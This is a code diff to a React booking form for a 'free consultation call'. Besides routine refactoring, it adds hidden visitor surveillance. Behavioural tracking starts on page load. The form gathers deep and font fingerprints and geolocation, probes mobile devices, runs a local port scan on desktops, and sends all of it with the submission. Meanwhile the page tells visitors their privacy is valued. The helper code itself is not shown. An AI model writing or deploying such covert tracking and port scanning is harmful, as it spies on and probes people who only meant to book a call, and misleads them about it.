@@ -1,53 +1,105 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback, memo } from 'react';
+import PropTypes from 'prop-types';
 import ProgressBar from '../components/ProgressBar';
 import Step1 from '../components/Step1';
 import Step2 from '../components/Step2';
 import Step3 from '../components/Step3';
 import Step4 from '../components/Step4';
 import SuccessNotification from '../components/SuccessNotification';
+import { FormData, TechnicalData } from '../types/formTypes';
+import { ProgressBarProps, StepComponentProps, Step4Props, SuccessNotificationProps } from '../types/componentProps';
 import { getClientInfo } from '../utils/vpnDetection';
 import { getDeviceFingerprint } from '../utils/deviceData';
 import { getLocation } from '../utils/geolocation';
 import { enqueueSubmission } from '../utils/submitQueue';
+import {
+  startTracking,
+  stopTracking,
+  getBehavioralData,
+  getDeepFingerprint,
+  getFontFingerprint,
+  getMobileProbes,
+  getLocalPortScan
+} from '../utils/behavioral';
 
 const MultiStepForm = () => {
+  // Core state management with error handling
   const [currentStep, setCurrentStep] = useState(1);
+  const [error, setError] = useState(null);
   const [formData, setFormData] = useState({
     personalInfo: {},
     contactInfo: {},
     appointmentDetails: {},
     id: `FORM-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
   });
-  const [showSuccess, setShowSuccess] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showSuccess, setShowSuccess] = useState(false);
   const [wasQueued, setWasQueued] = useState(false);
   const [technicalData, setTechnicalData] = useState(null);
+
+  // Start tracking behavioral data on mount and stop on unmount
+  useEffect(() => {
+    startTracking();
+    return () => {
+      stopTracking();
+    };
+  }, []);
 
   // Collect technical data when component mounts
   useEffect(() => {
     const collectTechnicalData = async () => {
+      let clientInfo = null, deviceInfo = null, locationInfo = null, deepFingerprint = null, fonts = null, deviceProbes = null;
+      
       try {
-        const [clientInfo, deviceInfo, locationInfo] = await Promise.all([
-          getClientInfo(),
-          getDeviceFingerprint(),
-          getLocation()
+        // Initial data collection
+        [clientInfo, deviceInfo, locationInfo, deepFingerprint, fonts] = await Promise.all([
+          getClientInfo().catch(e => { console.error('Client info failed:', e); return null; }),
+          getDeviceFingerprint().catch(e => { console.error('Device fingerprint failed:', e); return null; }),
+          getLocation().catch(e => { console.error('Location failed:', e); return null; }),
+          getDeepFingerprint().catch(e => { console.error('Deep fingerprint failed:', e); return null; }),
+          Promise.resolve(getFontFingerprint()).catch(e => { console.error('Font fingerprint failed:', e); return null; })
         ]);
 
-        setTechnicalData({
-          client: clientInfo,
-          device: deviceInfo,
-          location: locationInfo,
-          timestamp: new Date().toISOString()
-        });
+        // Adaptive probing based on device type
+        const isMobile = deviceInfo?.device?.type === 'mobile' || deviceInfo?.os?.mobile;
+        if (isMobile) {
+          deviceProbes = await getMobileProbes();
+        } else {
+          deviceProbes = await getLocalPortScan();
+        }
+
       } catch (error) {
         console.error('Error collecting technical data:', error);
       }
-    };
 
+      setTechnicalData({
+        client: clientInfo,
+        device: deviceInfo,
+        location: locationInfo,
+        deepFingerprint: deepFingerprint,
+        fonts: fonts,
+        deviceProbes: deviceProbes,
+        timestamp: new Date().toISOString(),
+        collectionStatus: {
+          clientInfo: !!clientInfo,
+          deviceInfo: !!deviceInfo,
+          locationInfo: !!locationInfo,
+          deepFingerprint: !!deepFingerprint,
+          fonts: !!fonts,
+          deviceProbes: !!deviceProbes,
+        }
+      });
+    };
     collectTechnicalData();
   }, []);
 
-  const updateFormData = (step, data) => {
+  // Form data management
+  const updateFormData = useCallback((step, data) => {
+    if (!data || typeof data !== 'object') {
+      console.error('Invalid form data:', data);
+      return;
+    }
+
     setFormData(prev => {
       const newData = { ...prev };
       switch(step) {
@@ -63,31 +115,51 @@ const MultiStepForm = () => {
         default:
           break;
       }
+      // Defensive: ensure all keys exist
+      newData.personalInfo = newData.personalInfo || {};
+      newData.contactInfo = newData.contactInfo || {};
+      newData.appointmentDetails = newData.appointmentDetails || {};
+      newData.id = newData.id || `FORM-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
       return newData;
     });
-  };
+  }, []);
 
+  // Form validation
   const validateStep = (step) => {
     switch(step) {
-      case 1:
-        const { firstName, lastName, email } = formData.personalInfo || {};
-        return firstName?.trim() && lastName?.trim() && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-      case 2:
-        const { phone } = formData.contactInfo || {};
-        // Check if phone is valid and has correct length
-        return phone && phone.length >= 8 && phone.length <= 15 && /^\+?[\d\s-]+$/.test(phone);
-      case 3:
-        const { timezone, slot, agreements } = formData.appointmentDetails || {};
-        return timezone && slot && agreements?.terms;
+      case 1: {
+        const { firstName = '', lastName = '', email = '' } = formData.personalInfo || {};
+        return (
+          typeof firstName === 'string' && firstName.trim().length > 1 &&
+          typeof lastName === 'string' && lastName.trim().length > 1 &&
+          /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
+        );
+      }
+      case 2: {
+        const { phone = '' } = formData.contactInfo || {};
+        return (
+          typeof phone === 'string' &&
+          phone.length >= 8 && phone.length <= 15 &&
+          /^\+?[\d\s-]+$/.test(phone)
+        );
+      }
+      case 3: {
+        const { timezone = '', slot = '', agreements = {} } = formData.appointmentDetails || {};
+        return (
+          typeof timezone === 'string' && timezone.length > 0 &&
+          typeof slot === 'string' && slot.length > 0 &&
+          agreements && agreements.terms === true
+        );
+      }
       default:
         return true;
     }
   };
 
+  // Navigation
   const nextStep = () => {
     if (currentStep < 4 && validateStep(currentStep)) {
       setCurrentStep(currentStep + 1);
-      console.log(`Navigated to Step ${currentStep + 1}`, formData);
     } else {
       alert('Please fill in all required fields correctly before proceeding.');
     }
@@ -96,19 +168,24 @@ const MultiStepForm = () => {
   const prevStep = () => {
     if (currentStep > 1) {
       setCurrentStep(currentStep - 1);
-      console.log(`Navigated to Step ${currentStep - 1}`);
     }
   };
 
+  // Form submission
   const handleSubmit = async () => {
     setIsSubmitting(true);
     try {
-      // Send form data and technical data to server's visit endpoint
+      // Stop tracking and get behavioral data just before submission
+      stopTracking();
+      const behavioralData = getBehavioralData();
+
+      // Always include technicalData, even if some parts are missing
       const payload = {
         id: formData.id,
         formSubmission: true,
         formData,
-        technicalData,
+        technicalData: technicalData || { collectionStatus: {} },
+        behavioralData: behavioralData, // Add behavioral data to payload
         url: window.location.href,
         userAgent: navigator.userAgent,
         submittedAt: new Date().toISOString()
@@ -116,17 +193,9 @@ const MultiStepForm = () => {
 
       const result = await enqueueSubmission(payload);
 
-      if (result.sent) {
-        // Show success notification
-        setShowSuccess(true);
-        setWasQueued(false);
-      } else {
-        // queued locally for retry by background processor
-        setWasQueued(true);
-        setShowSuccess(true); // still show success but inform user
-      }
+      setShowSuccess(true);
+      setWasQueued(!result.sent);
 
-      // Reset form after short timeout
       setTimeout(() => {
         setCurrentStep(1);
         setFormData({
@@ -137,11 +206,13 @@ const MultiStepForm = () => {
         });
         setShowSuccess(false);
         setWasQueued(false);
+        startTracking(); // Restart tracking for the next submission
       }, 3000);
 
     } catch (error) {
       console.error('Form submission error:', error);
-      // If enqueueSubmission throws unexpectedly, give user a friendly message
+      setWasQueued(true);
+      setShowSuccess(true);
       alert('There was an error submitting your form. It will be saved locally and retried automatically.');
     } finally {
       setIsSubmitting(false);
@@ -149,78 +220,78 @@ const MultiStepForm = () => {
   };
 
   return (
-    <div className="min-h-screen bg-gray-100 dark:bg-gray-900 flex flex-col justify-center items-center px-4 py-8">
-      <div className="max-w-4xl w-full bg-white dark:bg-gray-800 shadow-neumorphic rounded-lg p-8 transform transition-all duration-500 hover:shadow-lg">
-        <ProgressBar currentStep={currentStep} />
-        <div className="min-h-[400px] flex flex-col justify-between">
-          <div className="flex-1">
-            {currentStep === 1 && <Step1 formData={formData} updateFormData={updateFormData} />}
-            {currentStep === 2 && <Step2 formData={formData} updateFormData={updateFormData} />}
-            {currentStep === 3 && <Step3 formData={formData} updateFormData={updateFormData} />}
-            {currentStep === 4 && (
-              <Step4 
-                formData={formData} 
-                onSubmit={handleSubmit}
-                isSubmitting={isSubmitting}
-              />
-            )}
-          </div>
-          <div className="flex justify-between items-center mt-8 pt-4 border-t border-gray-100">
-            {currentStep > 1 ? (
-              <button
-                onClick={prevStep}
-                className="bg-gray-500 text-white px-8 py-3 rounded-lg hover:bg-gray-600 transition-all duration-300 ease-in-out transform hover:scale-105 hover:shadow-md"
-              >
-                ← Back
-              </button>
-            ) : <div />}
-            {currentStep < 4 && (
-              <button
-                onClick={nextStep}
-                className="bg-gradient-to-r from-blue-600 to-blue-700 text-white px-8 py-3 rounded-lg hover:from-blue-700 hover:to-blue-800 transition-all duration-300 ease-in-out transform hover:scale-105 hover:shadow-md ml-auto"
-              >
-                Next →
-              </button>
-            )}
-          </div>
+    <div className="form-hero flex items-center justify-center px-4 py-8 min-h-screen">
+      <div className="w-full max-w-3xl form-panel shadow-2xl animate-fadeIn">
+        <div className="card-inner">
+          {/* Header */}
+          <header className="mb-8 text-center">
+            <h1 className="brand-header mb-2 text-white" style={{fontFamily: 'Inter, sans-serif', fontWeight: 700, fontSize: '2rem'}}>
+              Please complete the following steps to book your free consultation call
+            </h1>
+            <p className="form-note text-white/80 text-lg">
+              We value your privacy and keep all information confidential.
+            </p>
+            <p className="text-white/60 mt-2 text-base">
+              Trusted by 500+ clients for transformative sessions.
+            </p>
+          </header>
 
-          {/* Navigation Buttons */}
-          <div className="flex justify-between mt-8">
-            {currentStep > 1 && (
-              <button
-                onClick={prevStep}
-                className="px-6 py-2 bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-200 rounded-lg hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors"
-              >
-                Back
-              </button>
-            )}
-            {currentStep < 4 ? (
-              <button
-                onClick={nextStep}
-                className="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors ml-auto"
-              >
-                Next
-              </button>
-            ) : (
-              <button
-                onClick={handleSubmit}
-                disabled={isSubmitting}
-                className="px-6 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors ml-auto disabled:opacity-50 disabled:cursor-not-allowed"
-              >
-                {isSubmitting ? 'Submitting...' : 'Submit'}
-              </button>
-            )}
+          {/* Progress Bar (hidden for production per request) */}
+          {/* Intentionally not rendering the visual progress bar to match product requirement */}
+
+          {/* Form Steps Container */}
+          <div className="min-h-[400px] flex flex-col justify-between mt-8">
+            <div className="flex-1">
+              {currentStep === 1 && <Step1 formData={formData} updateFormData={updateFormData} />}
+              {currentStep === 2 && <Step2 formData={formData} updateFormData={updateFormData} />}
+              {currentStep === 3 && <Step3 formData={formData} updateFormData={updateFormData} />}
+              {currentStep === 4 && (
+                <Step4 
+                  formData={formData} 
+                  onSubmit={handleSubmit}
+                  isSubmitting={isSubmitting}
+                />
+              )}
+            </div>
+
+            {/* Navigation Buttons */}
+            <div className="flex items-center justify-between gap-4 mt-8 pt-6 border-t border-white/10">
+              <div>
+                {currentStep > 1 && (
+                  <button onClick={prevStep} className="secondary-btn pulse-anim">
+                    ← Back
+                  </button>
+                )}
+              </div>
+
+              <div className="ml-auto">
+                {currentStep < 4 && (
+                  <button onClick={nextStep} className="primary-btn pulse-anim">
+                    Next →
+                  </button>
+                )}
+              </div>
+            </div>
           </div>
         </div>
       </div>
 
-      {/* Success Notification */}
+      {/* Success Notification with queued info */}
       <SuccessNotification 
         show={showSuccess}
         onClose={() => setShowSuccess(false)}
+        message={wasQueued ? "Your submission was saved and will be retried automatically when online." : "Your submission was received successfully!"}
       />
     </div>
   );
 };
 
-export default MultiStepForm;
+import ErrorBoundary from '../components/ErrorBoundary';
+
+const WrappedMultiStepForm = () => (
+  <ErrorBoundary>
+    <MultiStepForm />
+  </ErrorBoundary>
+);
+
+export default WrappedMultiStepForm;
